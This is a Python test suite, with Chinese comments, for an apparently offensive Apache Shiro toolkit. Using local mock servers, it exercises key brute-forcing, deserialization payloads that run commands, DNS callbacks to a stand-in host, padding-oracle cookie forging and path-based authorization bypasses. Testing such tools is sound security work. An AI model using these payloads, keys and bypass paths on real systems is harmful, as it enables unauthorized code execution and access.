#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""shirokit 自测套件。

覆盖：
    * 纯 Python AES 的 FIPS-197 向量 + Shiro Cookie 格式（IV 前缀）；
    * 密钥库审计（非法密钥必须被识别出来）；
    * 生成的 URLDNS payload 能被真实 JVM 反序列化并触发 DNS（需要 JDK，可跳过）；
    * 指纹识别 / 密钥爆破 / 漏洞利用 / 权限绕过 / Padding Oracle
      对本地 MockShiro、MockSpring 的端到端行为。
"""

from __future__ import annotations

import base64
import os
import shutil
import subprocess
import sys
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from shirokit import aes, brute, bypass, detect, gadgets, keys, padding, rememberme  # noqa: E402
from shirokit.callback import CallbackServer  # noqa: E402
from shirokit.httpc import HttpClient  # noqa: E402
from tests.mock_shiro import MockShiro, MockSpring  # noqa: E402

DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA=="
WRONG_KEYS = ["4AvVhmFLUs0KTA3Kprsdag==", "3AvVhmFLUs0KTA3Kprsdag=="]

JAVA = shutil.which("java")
JAVAC = shutil.which("javac")
YSOSERIAL_JAR = gadgets.find_ysoserial()
BUILD_DIR = os.path.join(ROOT, ".build-java")
MARKER_FILE = os.path.join(ROOT, ".cb1-marker.txt")


def java_build_dir() -> str:
    """编译测试用的 Java 小程序（只编译一次）。"""
    required = [
        os.path.join(BUILD_DIR, "PayloadRunner.class"),
        os.path.join(BUILD_DIR, "LoggingResolverProvider.class"),
        os.path.join(BUILD_DIR, "META-INF", "services",
                     "java.net.spi.InetAddressResolverProvider"),
    ]
    if all(os.path.exists(path) for path in required):
        return BUILD_DIR
    if not (JAVA and JAVAC):
        raise unittest.SkipTest("未安装 JDK，跳过 JVM 验证")
    shutil.rmtree(BUILD_DIR, ignore_errors=True)
    os.makedirs(BUILD_DIR, exist_ok=True)
    src = os.path.join(HERE, "java")
    files = [os.path.join(src, name) for name in
             ("PayloadRunner.java", "LoggingResolverProvider.java")]
    proc = subprocess.run([JAVAC, "-d", BUILD_DIR, *files],
                          capture_output=True, timeout=120)
    if proc.returncode != 0:
        raise unittest.SkipTest("javac 编译失败: " +
                                proc.stderr.decode("utf-8", "replace")[:300])
    services = os.path.join(BUILD_DIR, "META-INF", "services")
    os.makedirs(services, exist_ok=True)
    with open(os.path.join(services,
                           "java.net.spi.InetAddressResolverProvider"),
              "w", encoding="ascii") as fh:
        fh.write("LoggingResolverProvider\n")
    return BUILD_DIR


def tearDownModule():
    shutil.rmtree(BUILD_DIR, ignore_errors=True)
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)


class CryptoTest(unittest.TestCase):
    def test_fips197_vectors(self):
        self.assertTrue(aes.sample_aes_vector_check())

    def test_shiro_cookie_has_iv_prefix(self):
        key = aes.b64decode_key(DEFAULT_KEY)
        payload = b"\xac\xed\x00\x05payload"
        cookie = aes.shiro_encrypt(key, payload)
        self.assertEqual(len(cookie) % 16, 0)
        self.assertEqual(cookie[:16], bytes(16))          # 全零 IV
        self.assertEqual(aes.shiro_decrypt(key, cookie), payload)

    def test_random_iv_roundtrip(self):
        key = aes.b64decode_key(DEFAULT_KEY)
        data = os.urandom(100)
        cookie = aes.shiro_encrypt(key, data, os.urandom(16))
        self.assertEqual(aes.shiro_decrypt(key, cookie), data)

    def test_key_length_rejected(self):
        with self.assertRaises(ValueError):
            aes.b64decode_key("4r0J8E213D9x7Q2v6Z5sA==")   # base64 长度非法
        with self.assertRaises(ValueError):
            aes.b64decode_key("FlGAdIUNQADZXcKeQGEX")     # 解码 15 字节


class KeyDbTest(unittest.TestCase):
    def test_audit_flags_broken_legacy_keys(self):
        rows = keys.audit()
        self.assertTrue(rows)
        bad = [r for r in rows if not r["ok"]]
        self.assertGreaterEqual(len(bad), 3, "历史字典中的非法密钥应被识别")
        for row in bad:
            self.assertFalse(row["ok"])
            self.assertTrue(row["reason"])

    def test_load_keys_dedup_and_valid(self):
        entries = keys.load_keys()
        self.assertGreaterEqual(len(entries), 20)
        values = [e.key for e in entries]
        self.assertEqual(len(values), len(set(values)))
        for entry in entries:
            ok, _ = keys.check_key(entry.key)
            self.assertTrue(ok)


class UrlDnsJavaTest(unittest.TestCase):
    """用真实 JVM 验证内置 URLDNS payload（没有 JDK 时自动跳过）。"""

    @classmethod
    def setUpClass(cls):
        cls.build = java_build_dir()

    def test_payload_deserializes_and_triggers_lookup(self):
        host = "probe.invalid.example"
        payload = gadgets.url_dns_payload(host)
        path = os.path.join(self.build, "payload.bin")
        with open(path, "wb") as fh:
            fh.write(payload)
        proc = subprocess.run([JAVA, "-cp", self.build, "PayloadRunner", path],
                              capture_output=True, timeout=120)
        out = (proc.stdout or b"").decode("utf-8", "replace")
        err = (proc.stderr or b"").decode("utf-8", "replace")
        self.assertIn("DESER_OK java.util.HashMap", out, out + err)
        self.assertIn(f"[RESOLVER-LOOKUP] {host}", err, err)


class YsoserialTest(unittest.TestCase):
    """ysoserial 集成测试：探测、生成、真实 JVM 命令执行（无 jar 时跳过）。"""

    @classmethod
    def setUpClass(cls):
        if not YSOSERIAL_JAR:
            raise unittest.SkipTest("未找到 ysoserial jar，跳过集成测试")
        if not (JAVA and JAVAC):
            raise unittest.SkipTest("未安装 JDK，跳过 ysoserial 集成测试")
        cls.info = gadgets.probe_ysoserial(YSOSERIAL_JAR, java=JAVA)

    def test_payload_table(self):
        self.assertIn("CommonsBeanutils1", self.info.payloads)
        self.assertIn("JRMPListener", self.info.payloads)
        self.assertGreaterEqual(len(self.info.payloads), 20)
        self.assertIn("commons-beanutils",
                      self.info.dependency("CommonsBeanutils1").lower())

    def test_generate_common_gadgets(self):
        for gadget in ("CommonsBeanutils1", "CommonsCollections6", "URLDNS"):
            command = "whoami" if gadget != "URLDNS" else "http://x.cb.test"
            payload = gadgets.ysoserial_payload(YSOSERIAL_JAR, gadget, command,
                                                java=JAVA)
            self.assertTrue(payload.startswith(b"\xac\xed\x00\x05"), gadget)
            self.assertGreater(len(payload), 100)

    def test_cb1_executes_command_locally(self):
        build = java_build_dir()
        if os.path.exists(MARKER_FILE):
            os.remove(MARKER_FILE)
        if os.name == "nt":
            command = f'cmd /c echo CB1-OK> "{MARKER_FILE}"'
        else:
            command = f'sh -c "echo CB1-OK > {MARKER_FILE}"'
        payload = gadgets.ysoserial_payload(YSOSERIAL_JAR, "CommonsBeanutils1",
                                            command, java=JAVA)
        path = os.path.join(build, "cb1.bin")
        with open(path, "wb") as fh:
            fh.write(payload)
        classpath = os.pathsep.join([YSOSERIAL_JAR, build])
        proc = subprocess.run(
            [JAVA, *gadgets.jvm_module_flags(JAVA), "-cp", classpath,
             "PayloadRunner", path],
            capture_output=True, timeout=180)
        err = (proc.stderr or b"").decode("utf-8", "replace")
        # Runtime.exec 是异步的：反序列化返回时子进程可能还没写完，需要轮询
        content = ""
        deadline = time.time() + 10
        while time.time() < deadline:
            if os.path.exists(MARKER_FILE):
                with open(MARKER_FILE, "r", encoding="utf-8",
                          errors="replace") as fh:
                    content = fh.read()
                if "CB1-OK" in content:
                    break
            time.sleep(0.2)
        self.assertIn("CB1-OK", content, "CB1 未执行命令\n" + err[:600])

    def test_jrmp_listener_command(self):
        cmd = gadgets.jrmp_listener_command(YSOSERIAL_JAR, JAVA, 1099,
                                           "CommonsBeanutils1", "id")
        self.assertIn("-cp", cmd)
        self.assertNotIn("-jar", cmd)
        self.assertIn("ysoserial.exploit.JRMPListener", cmd)
        self.assertEqual(cmd[-4:], ["ysoserial.exploit.JRMPListener", "1099",
                                    "CommonsBeanutils1", "id"])

    def test_exploit_with_real_gadget_lands_on_mock(self):
        mock = MockShiro(DEFAULT_KEY).start()
        self.addCleanup(mock.stop)
        payload = gadgets.ysoserial_payload(YSOSERIAL_JAR, "CommonsBeanutils1",
                                            "whoami", java=JAVA)
        cookie = rememberme.build_cookie(DEFAULT_KEY, payload)
        resp = rememberme.send_cookie(HttpClient(timeout=5), mock.url + "/", cookie)
        self.assertFalse(rememberme.is_delete_me(resp))
        self.assertTrue(mock.payloads)
        self.assertTrue(mock.payloads[-1].get("serialized"))


class FingerprintTest(unittest.TestCase):
    def test_fingerprint_detects_shiro(self):
        mock = MockShiro(DEFAULT_KEY).start()
        self.addCleanup(mock.stop)
        client = HttpClient(timeout=5)
        fp = detect.fingerprint(client, mock.url, verbose=False)
        self.assertTrue(fp.shiro)
        self.assertTrue(fp.delete_me)
        self.assertTrue(fp.oracle_ready)
        self.assertTrue(any("deleteMe" in e for e in fp.evidence))


class BruteForceTest(unittest.TestCase):
    def test_finds_only_correct_key(self):
        callback = CallbackServer(dns_port=0, enable_http=False, verbose=False).start()
        self.addCleanup(callback.stop)
        mock = MockShiro(DEFAULT_KEY, dns_target=callback.dns_address).start()
        self.addCleanup(mock.stop)

        entries = [keys.KeyEntry(k, "test") for k in WRONG_KEYS[:1] +
                   [DEFAULT_KEY] + WRONG_KEYS[1:]]
        report = brute.brute_keys(mock.url, entries, "cb.test",
                                  client=HttpClient(timeout=5), server=callback,
                                  workers=4, callback_timeout=3, verbose=False)
        self.assertTrue(report.oracle_ok)
        hits = [p.key for p in report.hits]
        self.assertEqual(hits, [DEFAULT_KEY], f"hits={hits}")
        self.assertTrue(all(not p.dns_hit for p in report.probes
                            if p.key != DEFAULT_KEY))

    def test_oracle_unavailable_stops_early(self):
        mock = MockShiro(DEFAULT_KEY).start()          # 正常模式，一定会 deleteMe
        self.addCleanup(mock.stop)
        # 用一个不回 deleteMe 的静态服务器模拟“未启用 rememberMe”
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        import threading

        class Handle(BaseHTTPRequestHandler):
            def do_GET(self):
                body = b"<html>plain page</html>"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                return

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handle)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        report = brute.brute_keys(f"http://127.0.0.1:{server.server_address[1]}",
                                  [keys.KeyEntry(DEFAULT_KEY, "test")], "cb.test",
                                  client=HttpClient(timeout=5), workers=1,
                                  verbose=False)
        self.assertFalse(report.oracle_ok)
        self.assertEqual(report.hits, [])


class ExploitTest(unittest.TestCase):
    def test_url_dns_cookie_lands(self):
        callback = CallbackServer(dns_port=0, enable_http=False, verbose=False).start()
        self.addCleanup(callback.stop)
        mock = MockShiro(DEFAULT_KEY, dns_target=callback.dns_address).start()
        self.addCleanup(mock.stop)

        token = "exploit-token"
        payload = gadgets.url_dns_payload(f"{token}.cb.test")
        cookie = rememberme.build_cookie(DEFAULT_KEY, payload)
        iv, ct = rememberme.parse_cookie(cookie)
        self.assertEqual(len(iv), 16)
        resp = rememberme.send_cookie(HttpClient(timeout=5), mock.url + "/", cookie)
        self.assertFalse(rememberme.is_delete_me(resp))
        hit = callback.wait_for_dns(token, timeout=3)
        self.assertIsNotNone(hit, "未收到 DNS 回调")
        self.assertTrue(mock.remembered_payloads)

    def test_wrong_key_gets_delete_me(self):
        mock = MockShiro(DEFAULT_KEY).start()
        self.addCleanup(mock.stop)
        payload = gadgets.url_dns_payload("nope.cb.test")
        cookie = rememberme.build_cookie(WRONG_KEYS[0], payload)
        resp = rememberme.send_cookie(HttpClient(timeout=5), mock.url + "/", cookie)
        self.assertTrue(rememberme.is_delete_me(resp))


class BypassTest(unittest.TestCase):
    def test_scan_finds_known_bypasses(self):
        mock = MockSpring().start()
        self.addCleanup(mock.stop)
        report = bypass.scan(HttpClient(timeout=5), mock.url, "/admin/",
                             threads=4, verbose=False)
        self.assertTrue(report.baseline_is_protected)
        paths = {r.path for r in report.bypassed}
        for expected in ("/admin/..;/", "/;/admin/", "/admin/%3b"):
            self.assertIn(expected, paths, f"未识别 {expected}; got {sorted(paths)}")
        self.assertNotIn("/admin/%00/", paths)
        # 输出只标技术手法，不出现 CVE 编号
        self.assertNotIn("CVE-", report.describe())
        for result in report.results:
            self.assertIn(result.technique, bypass.TECHNIQUES)


class PaddingOracleTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.callback = CallbackServer(dns_port=0, enable_http=False, verbose=False).start()
        cls.mock = MockShiro(DEFAULT_KEY, leaky=True,
                             dns_target=cls.callback.dns_address).start()
        cls.client = HttpClient(timeout=5)

    @classmethod
    def tearDownClass(cls):
        cls.mock.stop()
        cls.callback.stop()

    def _oracle(self):
        return padding.PaddingOracle(self.client, self.mock.url,
                                     spec=padding.OracleSpec(kind="status", value="200"),
                                     verbose=False)

    def test_recover_then_forge(self):
        oracle = self._oracle()
        payload = b"\xac\xed\x00\x05HELLO"          # 8 字节 => 1 个密文块
        cookie = oracle.forge(payload)
        raw = base64.b64decode(cookie)
        plaintext = aes.pkcs7_unpad(aes.cbc_decrypt(self.mock.key, raw[16:], raw[:16]))
        self.assertEqual(plaintext, payload)
        self.assertLess(oracle.requests, 20000, "请求数异常，oracle 可能失效")

    def test_recover_cookie_plaintext(self):
        oracle = self._oracle()
        payload = b"\xac\xed\x00\x05" + b"B" * 12
        cookie = aes.shiro_encrypt_b64(self.mock.key, payload)
        recovered = aes.pkcs7_unpad(oracle.recover_cookie(cookie))
        self.assertEqual(recovered, payload)

    def test_calibration_detects_leaky_target(self):
        oracle = padding.PaddingOracle(self.client, self.mock.url, verbose=False)
        result = oracle.calibrate(probes=400, max_probes=900)
        self.assertTrue(result.ok, result.note)

    def test_calibration_rejects_normal_target(self):
        normal = MockShiro(DEFAULT_KEY).start()
        self.addCleanup(normal.stop)
        oracle = padding.PaddingOracle(self.client, normal.url, verbose=False)
        result = oracle.calibrate(probes=150, max_probes=200)
        self.assertFalse(result.ok)


class CliSmokeTest(unittest.TestCase):
    def _run(self, *args):
        return subprocess.run([sys.executable, "-m", "shirokit", *args],
                              capture_output=True, timeout=120,
                              cwd=ROOT,
                              env={**os.environ, "PYTHONIOENCODING": "utf-8"})

    def test_help(self):
        proc = self._run("--help")
        self.assertEqual(proc.returncode, 0, proc.stderr.decode("utf-8", "replace"))
        self.assertIn("shirokit", proc.stdout.decode("utf-8", "replace").lower())

    def test_keys_audit(self):
        proc = self._run("keys", "--audit")
        out = proc.stdout.decode("utf-8", "replace")
        self.assertEqual(proc.returncode, 0, proc.stderr.decode("utf-8", "replace"))
        self.assertIn("无效", out)

    def test_payload_url(self):
        proc = self._run("payload", "url", "--host", "a.b.cb.test", "--b64")
        self.assertEqual(proc.returncode, 0, proc.stderr.decode("utf-8", "replace"))
        b64 = proc.stdout.decode("utf-8", "replace").strip().splitlines()[-1]
        raw = base64.b64decode(b64)
        self.assertTrue(raw.startswith(b"\xac\xed\x00\x05"))

    def test_payload_list_and_generate_with_ysoserial(self):
        if not YSOSERIAL_JAR:
            self.skipTest("未找到 ysoserial jar")
        proc = self._run("payload", "list")
        out = proc.stdout.decode("utf-8", "replace")
        self.assertEqual(proc.returncode, 0, proc.stderr.decode("utf-8", "replace"))
        self.assertIn("CommonsBeanutils1", out)

        proc = self._run("payload", "ysoserial", "-g", "CB1", "-c", "whoami")
        self.assertEqual(proc.returncode, 0, proc.stderr.decode("utf-8", "replace"))
        lines = [line for line in proc.stdout.decode("utf-8", "replace").splitlines()
                 if line.strip()]
        raw = base64.b64decode(lines[-1])
        self.assertTrue(raw.startswith(b"\xac\xed\x00\x05"))
        self.assertGreater(len(raw), 500)


if __name__ == "__main__":
    unittest.main(verbosity=2)
